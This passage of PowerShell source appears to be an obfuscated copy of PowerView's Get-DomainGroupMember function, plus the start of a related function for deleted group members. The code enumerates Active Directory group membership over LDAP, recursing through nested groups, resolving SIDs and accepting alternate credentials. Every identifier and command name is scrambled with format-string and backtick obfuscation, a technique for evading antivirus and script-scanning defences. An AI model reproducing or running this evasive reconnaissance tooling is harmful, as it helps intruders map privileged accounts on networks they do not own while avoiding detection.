    [CmdletBinding(dEfaULTPARametErSETnAme = {"{1}{0}" -f 'one','N'})]
    Param(
        [Parameter(pOsiTIoN = 0, maNdAtoRy = ${tR`UE}, ValUeFrOMPIPeLINe = ${t`RUE}, VaLUEFROmpIpELINeBYProPERTynAmE = ${T`RUE})]
        [Alias({"{2}{1}{4}{5}{0}{3}" -f 'm','ist','D','e','inguis','hedNa'}, {"{1}{3}{0}{2}" -f'tN','SamAcc','ame','oun'}, {"{1}{0}" -f'e','Nam'}, {"{0}{1}{4}{3}{5}{2}" -f'Mem','be','dName','stingui','rDi','she'}, {"{0}{2}{1}" -f 'Memb','e','erNam'})]
        [String[]]
        ${Iden`TI`Ty},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Do`mAIN},

        [Parameter(PArAMeterSetnAME = "M`A`NuALreC`Ur`se")]
        [Switch]
        ${Rec`U`RSe},

        [Parameter(parAmeTeRSETnAME = "RE`curSEUSIN`g`ma`TChinGrU`le")]
        [Switch]
        ${rECURsEUs`ING`maTchIng`Ru`Le},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f'Fi','ter','l'})]
        [String]
        ${lDa`PF`ilTer},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'ADS','P','ath'})]
        [String]
        ${seARC`h`BaSE},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{2}{1}{3}"-f 'DomainCo','ll','tro','er','n'})]
        [String]
        ${sE`RveR},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{0}{2}{1}"-f'OneLe','l','ve'}, {"{1}{0}"-f'e','Subtre'})]
        [String]
        ${SEA`Rchs`Co`pE} = ("{2}{1}{0}"-f'btree','u','S'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`eSuL`TP`AgESI`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`e`RVErt`i`MelIM`It},

        [ValidateSet({"{1}{0}" -f'l','Dac'}, {"{0}{1}"-f 'Gr','oup'}, {"{0}{1}"-f 'N','one'}, {"{0}{1}" -f 'O','wner'}, {"{0}{1}" -f'Sa','cl'})]
        [String]
        ${sE`cURITYm`AsKs},

        [Switch]
        ${Tomb`s`ToNe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREde`N`Tial} =   $0Dsqr::"EMp`Ty"
    )

    BEGIN {
        ${s`earchERA`Rg`UmE`NtS} = @{
            ("{2}{1}{0}"-f'es','perti','Pro') = ("{4}{6}{9}{0}{3}{7}{10}{1}{8}{5}{2}{11}" -f'r,sama','me,distin','a','ccount','m','shedn','e','n','gui','mbe','a','me')
        }
        if (${PsBoUnDp`ARam`e`Ters}[("{0}{1}"-f'Do','main')]) { ${S`e`A`RcHE`RaRguM`Ents}[("{2}{0}{1}" -f 'o','main','D')] = ${d`OMain} }
        if (${pSBOun`dpA`R`A`mEters}[("{2}{0}{1}"-f 'F','ilter','LDAP')]) { ${seARcHE`RARg`UM`eNTS}[("{3}{2}{1}{0}"-f'r','Filte','DAP','L')] = ${l`DapfiL`TER} }
        if (${PsbO`UN`DParaM`ETErs}[("{1}{0}{2}"-f'rc','Sea','hBase')]) { ${SE`ArCHEr`AR`G`UMeNts}[("{0}{1}{2}"-f 'Se','a','rchBase')] = ${SE`A`RchbAse} }
        if (${PsBOuNdPa`RAm`Et`ERs}[("{1}{0}" -f'rver','Se')]) { ${sea`R`cHer`A`RG`UmeNTs}[("{1}{0}" -f 'rver','Se')] = ${Ser`VEr} }
        if (${psbOu`Nd`Para`MeT`erS}[("{1}{0}{2}" -f'Sc','Search','ope')]) { ${se`Ar`ChErAr`GUMeNTs}[("{2}{0}{1}" -f'earchSc','ope','S')] = ${searcH`Sco`PE} }
        if (${P`sboundP`ARA`MEterS}[("{3}{1}{0}{2}" -f'ltP','esu','ageSize','R')]) { ${sEarCheRaR`g`Umen`TS}[("{0}{1}{2}" -f'Re','sult','PageSize')] = ${REsU`Lt`PAGES`IzE} }
        if (${pSboUN`dpa`RaMeTe`RS}[("{0}{2}{4}{3}{1}" -f 'ServerTim','t','e','imi','L')]) { ${SeArC`herAr`g`UmENTS}[("{2}{0}{3}{1}{4}"-f 'r','TimeL','Se','ver','imit')] = ${SeRV`ERT`iMel`IM`it} }
        if (${PsBouNd`pA`Ra`MEtERS}[("{0}{1}{2}"-f 'T','ombs','tone')]) { ${sea`RC`H`ERaRgumEnTS}[("{1}{0}{2}" -f'mbston','To','e')] = ${tOM`BsTO`Ne} }
        if (${PsB`ou`NDPArAM`EtE`Rs}[("{2}{0}{1}" -f 'n','tial','Crede')]) { ${SEaRch`e`RaRGuM`en`TS}[("{1}{0}{2}" -f 'entia','Cred','l')] = ${c`R`eDe`NTIAL} }

        ${aDna`MeA`RGUM`ENtS} = @{}
        if (${psbOUndpa`R`Am`eteRs}[("{0}{1}"-f'Domai','n')]) { ${ADna`MEA`R`gUMentS}[("{0}{1}" -f 'Domai','n')] = ${dom`AIn} }
        if (${pSBOUNd`pAr`A`MEteRs}[("{0}{2}{1}"-f'Se','er','rv')]) { ${Ad`NAmE`ARGuM`eNTs}[("{0}{1}{2}" -f 'Serv','e','r')] = ${SEr`V`Er} }
        if (${p`sBOu`NdPar`Am`ETeRS}[("{0}{3}{1}{2}" -f'Cred','ti','al','en')]) { ${aD`N`AmeARguMe`NtS}[("{2}{0}{1}"-f'rede','ntial','C')] = ${crED`eN`TIal} }
    }

    PROCESS {
        ${G`Ro`UPSe`Archer} = &("{0}{4}{2}{1}{3}" -f 'G','inSe','-Doma','archer','et') @SearcherArguments
        if (${gROu`P`SeaRch`Er}) {
            if (${P`S`BOuNDp`AR`AMET`eRS}[("{3}{4}{0}{6}{2}{5}{1}"-f'urse','Rule','ingMatchi','R','ec','ng','Us')]) {
                ${sEARchE`R`ARGU`MentS}[("{2}{1}{0}"-f 'ty','denti','I')] = ${I`DeNT`ITy}
                ${SEaRch`Er`ARG`U`M`ENTs}['Raw'] = ${TR`UE}
                ${G`R`oUP} = &("{3}{1}{4}{0}{2}"-f 'ainG','e','roup','G','t-Dom') @SearcherArguments

                if (-not ${gro`Up}) {
                    &("{0}{1}{3}{2}" -f'Write-Wa','rni','g','n') ('[Get-Dom'+'a'+'inGr'+'oupM'+'ember]'+' '+'Er'+'ror '+'s'+'earchin'+'g '+'fo'+'r '+'gro'+'up'+' '+'wi'+'th '+'ide'+'nt'+'ity: '+"$Identity")
                }
                else {
                    ${GRO`UPfOu`N`d`Name} = ${GrO`UP}."pr`operT`i`Es".("{1}{0}" -f'em','it').Invoke(("{3}{1}{2}{0}"-f'ntname','ac','cou','sam'))[0]
                    ${G`RoUpFo`Un`DDN} = ${g`R`OUp}."pRoPEr`Ti`Es".("{1}{0}" -f 'em','it').Invoke(("{4}{2}{1}{3}{0}"-f'e','ed','nguish','nam','disti'))[0]

                    if (${PSb`ounDPara`ME`TErS}[("{0}{1}"-f'Do','main')]) {
                        ${Grou`Pfou`Nddo`mA`iN} = ${dOM`AIn}
                    }
                    else {
                        
                        if (${GROU`pfOun`DDn}) {
                            ${g`Ro`UpFou`Nd`doma`in} = ${groUPfOUN`d`dn}.("{2}{1}{0}" -f'ng','ri','SubSt').Invoke(${gRoUP`Fo`UNdDn}.("{2}{1}{0}" -f 'exOf','nd','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    &("{3}{1}{2}{0}{4}"-f's','rite','-Verbo','W','e') ('[Get-'+'Do'+'mai'+'n'+'G'+'roupMember]'+' '+'Us'+'ing '+'LDA'+'P '+'matchin'+'g'+' '+'rul'+'e '+'to'+' '+'r'+'ecur'+'se '+'o'+'n '+"'$GroupFoundDN', "+'onl'+'y '+'u'+'ser '+'acc'+'o'+'u'+'nts '+'will'+' '+'b'+'e '+'re'+'tu'+'rned.')
                    ${G`RoUpS`eARC`HER}."fI`lT`er" = "(&(samAccountType=805306368)(memberof:1.2.840.113556.1.4.1941:=$GroupFoundDN))"
                    ${Grou`P`s`EArCheR}."PrOp`ErtIES`TOL`O`Ad".("{2}{1}{0}" -f'e','g','AddRan').Invoke((("{2}{3}{4}{0}{1}{5}" -f 'inguishedN','a','d','i','st','me')))
                    ${ME`MbE`RS} = ${grou`pSEA`RcH`er}.("{2}{1}{0}"-f'll','A','Find').Invoke() | &("{3}{4}{2}{0}{1}"-f 'bje','ct','O','ForE','ach-') {${_}."pRO`P`eRtIEs"."dIStINgUiS`h`ED`NA`mE"[0]}
                }
                ${n`ULL} = ${S`e`A`R`cheRaRgUmEN`Ts}.("{0}{1}" -f 'Rem','ove').Invoke('Raw')
            }
            else {
                ${I`denTI`TyFilt`ER} = ''
                ${FIL`TeR} = ''
                ${I`dEntITY} | &("{1}{0}{2}" -f're-','Whe','Object') {${_}} | &("{0}{2}{1}{3}" -f'ForEa','O','ch-','bject') {
                    ${i`DENtiTyInSTA`N`cE} = ${_}.("{1}{0}"-f 'ace','Repl').Invoke('(', '\28').("{0}{2}{1}"-f 'Rep','e','lac').Invoke(')', '\29')
                    if (${Iden`TiTy`inst`AN`CE} -match ("{1}{0}" -f'S-1-','^')) {
                        ${i`dEN`Ti`TY`FiLtER} += "(objectsid=$IdentityInstance)"
                    }
                    elseif (${IDE`N`TITYIN`ST`ANce} -match ("{0}{1}"-f '^','CN=')) {
                        ${Ide`NTi`TYfiL`Ter} += "(distinguishedname=$IdentityInstance)"
                        if ((-not ${PsB`OU`NDPAR`AmetE`RS}[("{1}{0}"-f 'n','Domai')]) -and (-not ${PSBOunDp`ArAmet`E`Rs}[("{2}{0}{1}" -f'ear','chBase','S')])) {
                            
                            
                            ${I`dentiT`YD`oMaIN} = ${iDeNt`i`Ty`INS`TanCE}.("{0}{1}"-f'Su','bString').Invoke(${Id`e`NTi`TYInsTAN`cE}.("{1}{2}{0}"-f'f','I','ndexO').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                            &("{0}{4}{1}{3}{2}" -f'W','erb','se','o','rite-V') ('['+'Get-DomainGro'+'up'+'M'+'embe'+'r] '+'E'+'xtr'+'acted'+' '+'do'+'main '+"'$IdentityDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${SeAr`C`HeR`A`RgUMeNTs}[("{1}{0}" -f 'ain','Dom')] = ${Iden`TitYd`o`MaIN}
                            ${group`SE`ArcH`er} = &("{3}{1}{0}{4}{2}"-f 'ai','-Dom','her','Get','nSearc') @SearcherArguments
                            if (-not ${GrO`UPS`e`ARc`HER}) {
                                &("{2}{0}{1}" -f 'Wa','rning','Write-') ('[Get'+'-Domain'+'G'+'rou'+'pMemb'+'er]'+' '+'Un'+'abl'+'e '+'to'+' '+'r'+'etri'+'ev'+'e '+'d'+'omai'+'n '+'se'+'ar'+'c'+'her '+'fo'+'r '+"'$IdentityDomain'")
                            }
                        }
                    }
                    elseif (${IdEntI`T`YiNSTA`N`cE} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        ${G`UiDBY`Te`sT`RiNg} = (([Guid]${IDENt`ITy`I`N`ST`ANcE}).("{2}{1}{0}"-f 'y','oByteArra','T').Invoke() | &("{0}{2}{4}{3}{1}" -f 'ForE','ect','ach','j','-Ob') { '\' + ${_}.("{0}{1}{2}"-f 'ToS','trin','g').Invoke('X2') }) -join ''
                        ${idEn`Ti`TY`FIl`TER} += "(objectguid=$GuidByteString)"
                    }
                    elseif (${i`DeNT`ityinST`ANcE}.("{2}{1}{0}"-f'ins','a','Cont').Invoke('\')) {
                        ${C`ON`VeRteDIDE`NtiTYI`NSTAN`ce} = ${IDENTIty`in`sTaN`ce}.("{2}{1}{0}" -f'ace','pl','Re').Invoke('\28', '(').("{2}{0}{1}"-f 'plac','e','Re').Invoke('\29', ')') | &("{3}{2}{4}{0}{1}"-f '-AD','Name','n','Co','vert') -OutputType ("{1}{0}{2}"-f 'an','C','onical')
                        if (${cOnVerT`eDIDe`NTI`T`YinStan`ce}) {
                            ${g`Roup`Dom`AIN} = ${CoN`Ve`R`TEdIDEN`Tit`yin`STA`NCE}.("{0}{1}{2}" -f'S','ubStrin','g').Invoke(0, ${cO`N`VerTedi`DenTItYi`Ns`T`ANcE}.("{1}{0}" -f'dexOf','In').Invoke('/'))
                            ${grOup`N`AME} = ${idE`N`TITy`I`NStaN`Ce}.("{1}{0}"-f't','Spli').Invoke('\')[1]
                            ${idEnTi`TYfI`lT`ER} += "(samAccountName=$GroupName)"
                            ${seA`RC`h`ErArGu`MEntS}[("{0}{1}"-f'Domai','n')] = ${g`R`oUPdOMA`iN}
                            &("{3}{0}{1}{2}" -f 'e-Ver','bos','e','Writ') ('[Get-Dom'+'ainG'+'roupMem'+'ber]'+' '+'E'+'xtracte'+'d '+'do'+'ma'+'in '+"'$GroupDomain' "+'f'+'rom '+"'$IdentityInstance'")
                            ${gr`ouP`S`eArcheR} = &("{1}{3}{0}{2}" -f 'a','G','rcher','et-DomainSe') @SearcherArguments
                        }
                    }
                    else {
                        ${Id`enTi`TYF`iL`TeR} += "(samAccountName=$IdentityInstance)"
                    }
                }

                if (${Id`ENtI`TyFi`lTeR} -and (${Id`eNTitYF`iL`TeR}.("{1}{0}"-f 'im','Tr').Invoke() -ne '') ) {
                    ${FIl`T`Er} += "(|$IdentityFilter)"
                }

                if (${P`SbOuNDp`ARA`METERs}[("{1}{0}{2}" -f 'PFi','LDA','lter')]) {
                    &("{2}{1}{3}{0}" -f 'te-Verbose','r','W','i') ('['+'Get-DomainGr'+'oup'+'Member'+'] '+'Usi'+'ng '+'a'+'ddi'+'tion'+'al '+'L'+'DAP '+'f'+'ilt'+'er: '+"$LDAPFilter")
                    ${f`IL`TeR} += "$LDAPFilter"
                }

                ${grouP`s`E`ARchER}."fILT`Er" = "(&(objectCategory=group)$Filter)"
                &("{1}{0}{2}" -f 'te-','Wri','Verbose') "[Get-DomainGroupMember] Get-DomainGroupMember filter string: $($GroupSearcher.filter) "
                try {
                    ${Re`Su`LT} = ${gr`o`UPS`e`ArCHER}.("{1}{0}{2}" -f 'd','Fin','One').Invoke()
                }
                catch {
                    &("{2}{0}{1}"-f'rite-Warn','ing','W') ('[Get'+'-'+'DomainGroup'+'Mem'+'ber] '+'Error'+' '+'searchi'+'ng'+' '+'fo'+'r '+'group'+' '+'with'+' '+'ide'+'n'+'tity '+"'$Identity': "+"$_")
                    ${MEM`Be`RS} = @()
                }

                ${GrOu`PfounD`NAmE} = ''
                ${gRoup`F`oUnddn} = ''

                if (${re`s`ULt}) {
                    ${mE`MbE`RS} = ${R`E`suLt}."p`RopeRt`iES".("{0}{1}"-f 'it','em').Invoke(("{2}{1}{0}" -f'er','emb','m'))

                    if (${meM`Bers}."Co`UnT" -eq 0) {
                        
                        ${Fin`iS`HEd} = ${f`ALse}
                        ${b`O`Ttom} = 0
                        ${t`oP} = 0

                        while (-not ${Fin`iSh`eD}) {
                            ${t`oP} = ${B`O`TTOM} + 1499
                            ${ME`M`BErra`NgE}="member;range=$Bottom-$Top"
                            ${bO`T`TOM} += 1500
                            ${NU`lL} = ${gr`oUPs`ea`RcHer}."ProPe`R`TieSt`OLO`AD".("{1}{0}" -f 'lear','C').Invoke()
                            ${n`UlL} = ${gr`oUP`Search`er}."Pro`P`ER`T`iESTolOAD".("{0}{1}"-f 'Ad','d').Invoke("$MemberRange")
                            ${N`UlL} = ${Gro`UPSe`ArCHER}."PRoPeR`T`Ies`TOLoAD".("{1}{0}"-f 'dd','A').Invoke(("{1}{0}{2}{3}" -f'mac','sa','countnam','e'))
                            ${nU`Ll} = ${g`R`oUps`EArchER}."PRoPe`RtI`estOL`Oad".("{0}{1}"-f 'Ad','d').Invoke(("{1}{3}{2}{0}" -f 'me','distin','uishedna','g'))

                            try {
                                ${R`es`ULT} = ${GR`o`UPSeARc`H`ER}.("{2}{1}{0}" -f'ne','indO','F').Invoke()
                                ${r`AnGeDp`ROpE`RTY} = ${re`S`Ult}."PRO`pErt`Ies"."pROpE`R`T`yNa`mes" -like ("{1}{0}{2}" -f 'ran','member;','ge=*')
                                ${m`Em`BeRS} += ${rE`SuLT}."Pr`OPERT`IEs".("{0}{1}"-f 'it','em').Invoke(${RANg`E`dpRo`pE`RTY})
                                ${G`Roup`FOUNdn`AmE} = ${Re`SULt}."ProPeR`T`iES".("{1}{0}"-f'tem','i').Invoke(("{0}{3}{2}{1}" -f'sama','me','ountna','cc'))[0]
                                ${GroU`pFo`UN`Ddn} = ${rES`U`lt}."p`ROpERTi`eS".("{1}{0}" -f'em','it').Invoke(("{3}{0}{2}{4}{5}{1}" -f 's','e','ti','di','nguishedn','am'))[0]

                                if (${mEmb`E`RS}."c`ounT" -eq 0) {
                                    ${FiN`I`sHeD} = ${Tr`UE}
                                }
                            }
                            catch [System.Management.Automation.MethodInvocationException] {
                                ${F`inISh`Ed} = ${Tr`Ue}
                            }
                        }
                    }
                    else {
                        ${gr`OUpFou`Ndna`ME} = ${RE`sULT}."pRoPer`Ti`ES".("{0}{1}"-f 'i','tem').Invoke(("{2}{4}{0}{1}{3}" -f 'n','t','samacc','name','ou'))[0]
                        ${gr`OuP`FoU`NDdn} = ${rEs`U`lT}."Proper`Ti`eS".("{1}{0}" -f'em','it').Invoke(("{0}{1}{3}{2}" -f 'distin','guish','name','ed'))[0]
                        ${Mem`Be`RS} += ${R`e`SUlT}."Pr`ope`Rt`IeS".("{1}{0}" -f'tem','i').Invoke(${R`ANgeD`p`R`OpeRTY})
                    }

                    if (${pSBOund`PA`RAm`E`TERS}[("{0}{1}"-f 'Doma','in')]) {
                        ${group`F`ou`N`Ddo`mAiN} = ${D`Om`AIN}
                    }
                    else {
                        
                        if (${g`RoUP`F`Ou`NDdN}) {
                            ${GRo`UpF`Ou`N`dd`omaIN} = ${GRoup`FOU`N`d`Dn}.("{0}{1}{2}" -f 'Sub','S','tring').Invoke(${G`RO`UPf`o`UnDDn}.("{0}{1}{2}" -f'I','ndex','Of').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                }
            }

            ForEach (${m`eMBEr} in ${M`emb`eRs}) {
                if (${Re`cu`RSE} -and ${use`mAtc`H`inGR`Ule}) {
                    ${p`Ro`PErTiEs} = ${_}."Pro`p`eRTIeS"
                }
                else {
                    ${Ob`jectsear`C`HerARGU`MENTS} = ${sE`ARchErA`RgUM`eNTs}.("{1}{0}" -f 'ne','Clo').Invoke()
                    ${o`BjE`CTs`eArC`He`RArgU`ments}[("{0}{1}" -f'Ident','ity')] = ${M`E`mBER}
                    ${ObJE`cTSE`Arc`h`ERAr`GUM`EN`Ts}['Raw'] = ${tr`Ue}
                    ${o`BjecTse`ArchEra`RG`U`mEN`TS}[("{2}{1}{0}"-f 'ies','opert','Pr')] = ("{2}{10}{11}{5}{4}{0}{3}{1}{7}{8}{9}{6}{12}"-f'n,samaccountname','j','dis',',objectsid,ob','ame,c','guishedn','as','ec','tc','l','ti','n','s')
                    ${oB`jE`ct} = &("{1}{3}{4}{0}{2}"-f'a','G','inObject','et-D','om') @ObjectSearcherArguments
                    ${P`RoP`ertIes} = ${ObJE`cT}."PropE`Rt`IES"
                }

                if (${P`R`OpErti`es}) {
                    ${g`Ro`UpMEm`Ber} = &("{2}{1}{0}"-f'ct','bje','New-O') ("{0}{1}"-f'P','SObject')
                    ${g`ROU`pme`mbER} | &("{0}{1}{2}"-f 'Add-','Me','mber') ("{1}{3}{0}{2}" -f 'rt','Noteprop','y','e') ("{1}{0}{2}" -f 'oupDoma','Gr','in') ${G`RoUP`FouNd`DO`Ma`IN}
                    ${gRoup`Me`Mb`er} | &("{3}{0}{1}{2}"-f'-M','e','mber','Add') ("{1}{0}{2}" -f 'r','Noteprope','ty') ("{1}{2}{0}"-f'e','Gr','oupNam') ${GrOUpfOuN`D`NA`ME}
                    ${GRo`Up`MEMb`ER} | &("{2}{1}{0}" -f'r','e','Add-Memb') ("{3}{1}{0}{2}"-f'pert','epro','y','Not') ("{1}{4}{3}{2}{5}{0}"-f'me','Gr','d','tinguishe','oupDis','Na') ${groUP`FO`UNddN}

                    if (${P`ROPe`RtIEs}."obJEc`TS`iD") {
                        ${Me`m`BErsiD} = ((&("{2}{1}{0}" -f 'ject','b','New-O') ("{13}{8}{4}{7}{1}{3}{11}{0}{12}{9}{10}{6}{5}{2}" -f'ncipa','i','r','ty.Pr','em.S','e','i','ecur','t','yIden','tif','i','l.Securit','Sys') ${pROPEr`T`I`ES}."oB`JEc`TSiD"[0], 0)."VAl`Ue")
                    }
                    else {
                        ${m`eM`B`eRSid} = ${nu`LL}
                    }

                    try {
                        ${m`EmBE`Rdn} = ${PrOp`eR`TIes}."dISTING`UIsHED`N`AmE"[0]
                        if (${M`e`mbER`dN} -match ((("{3}{0}{6}{9}{8}{1}{5}{7}{4}{2}{10}"-f 'eign','ityPr','-1-5','For','cipalse8QS','i','S','n','cur','e','-21'))  -REPlAcE  'e8Q',[cHAR]124)) {
                            try {
                                if (-not ${MEM`B`ErsId}) {
                                    ${mEm`B`erSId} = ${pr`o`PEr`TiEs}."cN"[0]
                                }
                                ${mEMb`erSim`p`le`NAmE} = &("{2}{4}{1}{0}{3}" -f'm','DNa','Conv','e','ert-A') -Identity ${me`MBE`RSId} -OutputType ("{0}{2}{1}{3}" -f'Do','mpl','mainSi','e') @ADNameArguments

                                if (${MEmB`erSIMpl`En`AMe}) {
                                    ${M`em`BE`RdoMain} = ${memb`Er`s`iMpL`ENAmE}.("{0}{1}"-f'S','plit').Invoke('@')[1]
                                }
                                else {
                                    &("{3}{2}{1}{0}"-f 'ning','r','e-Wa','Writ') ('[Get-D'+'omai'+'nGro'+'upMembe'+'r] '+'Error'+' '+'conve'+'rting'+' '+"$MemberDN")
                                    ${Me`MBe`RD`oMA`iN} = ${N`ULl}
                                }
                            }
                            catch {
                                &("{0}{2}{1}"-f'Write','rning','-Wa') ('[G'+'et-Doma'+'inG'+'roup'+'Memb'+'er] '+'Err'+'or'+' '+'conver'+'ti'+'n'+'g '+"$MemberDN")
                                ${mE`mBerD`o`m`AIn} = ${NU`ll}
                            }
                        }
                        else {
                            
                            ${MEMb`E`RdOmaiN} = ${me`Mbe`Rdn}.("{2}{0}{1}" -f 't','ring','SubS').Invoke(${MEm`BeR`DN}.("{1}{0}{2}"-f 'nde','I','xOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                    }
                    catch {
                        ${m`eM`BErdn} = ${n`UlL}
                        ${M`Em`BeRDOMain} = ${N`Ull}
                    }

                    if (${PrOP`er`TiEs}."S`AMA`cc`ouNtnaME") {
                        
                        ${M`e`MBErN`AME} = ${PRoPeR`Ti`eS}."SamACC`Ou`NTna`mE"[0]
                    }
                    else {
                        
                        try {
                            ${MemB`E`R`NaME} = &("{1}{2}{0}"-f'D','ConvertFrom-S','I') -ObjectSID ${p`ROPER`T`IES}."C`N"[0] @ADNameArguments
                        }
                        catch {
                            
                            ${mem`Ber`NAmE} = ${PR`o`pERti`es}."cN"[0]
                        }
                    }

                    if (${Pr`OPeR`TiES}."obje`ctC`laSS" -match ("{2}{1}{0}" -f 'r','ompute','c')) {
                        ${MEmBE`RObJe`C`T`ClaSs} = ("{2}{0}{1}" -f 'ut','er','comp')
                    }
                    elseif (${p`RopE`R`TIES}."ObJ`ec`TCL`Ass" -match ("{0}{1}" -f'gro','up')) {
                        ${m`EMbero`BJE`cTC`l`Ass} = ("{1}{0}" -f 'up','gro')
                    }
                    elseif (${PRO`PEr`TIEs}."Ob`JecT`clASS" -match ("{1}{0}"-f'er','us')) {
                        ${MeMB`Erob`Je`ctc`lAsS} = ("{0}{1}"-f'u','ser')
                    }
                    else {
                        ${M`E`MBEro`BjeCTc`La`ss} = ${n`UlL}
                    }
                    ${gR`ouPm`eMBEr} | &("{1}{0}{2}" -f'-Mem','Add','ber') ("{2}{0}{3}{1}"-f 'ote','ty','N','proper') ("{3}{0}{1}{2}" -f 'rD','oma','in','Membe') ${me`Mbe`RdoMAin}
                    ${gro`UP`M`EmbeR} | &("{1}{0}{3}{2}" -f'd','Ad','ber','-Mem') ("{3}{1}{0}{2}"-f 'rt','pe','y','Notepro') ("{0}{1}{3}{2}"-f'Memb','erN','me','a') ${ME`M`BeRnA`me}
                    ${GR`O`UPMe`mBeR} | &("{2}{1}{0}" -f 'mber','Me','Add-') ("{2}{1}{0}" -f 'eproperty','ot','N') ("{0}{3}{2}{1}"-f'MemberDisting','me','Na','uished') ${ME`Mbe`RDn}
                    ${gR`Oup`m`emBer} | &("{1}{0}{2}"-f 'dd-Mem','A','ber') ("{0}{1}{2}{3}"-f 'N','oteprope','rt','y') ("{4}{3}{1}{2}{0}" -f 'ss','C','la','ject','MemberOb') ${MeMbEr`o`BJ`Ectc`LASS}
                    ${GROupm`eM`BeR} | &("{2}{1}{0}" -f 'er','dd-Memb','A') ("{0}{2}{1}"-f'Notepr','y','opert') ("{0}{2}{1}" -f 'M','berSID','em') ${m`EMb`ERsId}
                    ${gR`OUPM`emB`eR}."pSOb`jE`cT"."TY`PEnA`M`ES".("{0}{1}" -f 'Ins','ert').Invoke(0, ("{1}{0}{2}{3}" -f'w.G','PowerVie','roupMem','ber'))
                    ${gr`OuPMem`BER}

                    
                    if (${PSbou`N`d`PARaMeteRS}[("{1}{0}" -f 'e','Recurs')] -and ${Mem`Be`RDN} -and (${MEmBeR`o`B`jectcla`sS} -match ("{1}{0}"-f 'roup','g'))) {
                        &("{2}{3}{1}{0}" -f 'e','te-Verbos','Wr','i') ('[Get-D'+'omai'+'n'+'GroupMem'+'ber] '+'Man'+'u'+'ally '+'r'+'ecursi'+'ng '+'on'+' '+'grou'+'p: '+"$MemberDN")
                        ${s`EaRCheR`A`RgUMe`Nts}[("{0}{1}" -f 'Id','entity')] = ${MEm`Be`RdN}
                        ${NU`LL} = ${s`E`ArcHer`Argum`E`Nts}.("{1}{2}{0}"-f 've','Rem','o').Invoke(("{2}{1}{0}"-f'ties','er','Prop'))
                        &("{1}{3}{2}{4}{0}{5}" -f'o','Ge','inG','t-Doma','r','upMember') @SearcherArguments
                    }
                }
            }
            ${Gro`UP`sEARch`Er}.("{1}{0}{2}"-f'is','d','pose').Invoke()
        }
    }
}


function GE`T-dOmAIn`gROuPMEMbe`RD`E`lEt`Ed {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{1}{6}{2}{5}{3}{7}{0}"-f 'ts','eDecla','M','ThanAss','PSUs','ore','redVars','ignmen'}, '')]
    [OutputType({"{5}{3}{4}{0}{2}{1}"-f'mbe','d','rDelete','View.Domain','GroupMe','Power'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosItioN = 0, vALuEfRoMPIpeliNE = ${tr`Ue}, vALUefRoMpipElINebYPRoPeRTyNAmE = ${T`RUE})]
        [Alias({"{2}{4}{0}{3}{1}"-f'uished','ame','Dis','N','ting'}, {"{3}{0}{2}{1}"-f 'cc','Name','ount','SamA'}, {"{0}{1}" -f 'N','ame'}, {"{1}{4}{2}{0}{3}"-f 'gui','Membe','Distin','shedName','r'}, {"{1}{2}{0}" -f 'me','MemberN','a'})]
        [String[]]
        ${ideNt`I`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`ma`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{2}{1}" -f 'Fi','er','lt'})]
        [String]
        ${ldApFI`l`T`Er},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}{2}" -f'A','DSPat','h'})]
        [String]
        ${SEarcH`B`Ase},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{4}{1}{3}{2}"-f 'D','mai','r','nControlle','o'})]
        [String]
        ${se`R`Ver},

        [ValidateSet({"{1}{0}"-f 'se','Ba'}, {"{1}{0}"-f 'evel','OneL'}, {"{0}{1}" -f 'Sub','tree'})]
        [String]
        ${seAr`CHSc`O`Pe} = ("{1}{0}" -f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${R`ESuLt`p`Ages`ize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${seRvE`RTi`M`eLi`m`iT},

        [Switch]
        ${tOm`B`sTone},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEde`N`TiAl} =  (vaRIaBle  ('0DS'+'qr') ).vAlue::"e`mpTy",

        [Switch]
        ${R`AW}
    )

    BEGIN {
        ${s`EaRChErAr`GumE`Nts} = @{
            ("{0}{2}{1}"-f 'Pro','es','perti')    =   ("{0}{1}{4}{3}{2}" -f 'msds-r','eplval','tadata','me','ue'),("{1}{3}{0}{4}{2}" -f 'st','d','uishedname','i','ing')
            'Raw'           =   ${Tr`Ue}
            ("{0}{1}{2}" -f'LDAPFil','te','r')    =   ("{2}{1}{3}{0}{4}{5}" -f 'r','c','(obje','tCatego','y=','group)')
        }
        if (${PsBo`UnDpA`Rame`TE`Rs}[("{0}{1}{2}" -f 'Dom','ai','n')]) { ${sEA`R`chERaR`GU`M`EntS}[("{0}{1}"-f'Doma','in')] = ${dOMA`in} }
        if (${p`sb`ouN`Dparamet`ERs}[("{0}{2}{1}" -f'LDAP','er','Filt')]) { ${SEArcHE`RARGU`MEn`TS}[("{1}{0}{2}{3}"-f'AP','LD','Filt','er')] = ${lDAP`F`i`lter} }
        if (${PSBoun`dP`A`RAMEtERS}[("{1}{0}{2}" -f 'ch','Sear','Base')]) { ${sEa`R`CHErA`RgUMeNTS}[("{2}{0}{1}" -f 'arch','Base','Se')] = ${Sea`Rc`HBasE} }
        if (${P`S`B`ounDpaRAM`ETE`RS}[("{0}{1}" -f 'Se','rver')]) { ${SEA`RC`Hera`R`guMEnTs}[("{0}{1}"-f 'Serve','r')] = ${s`ERv`er} }
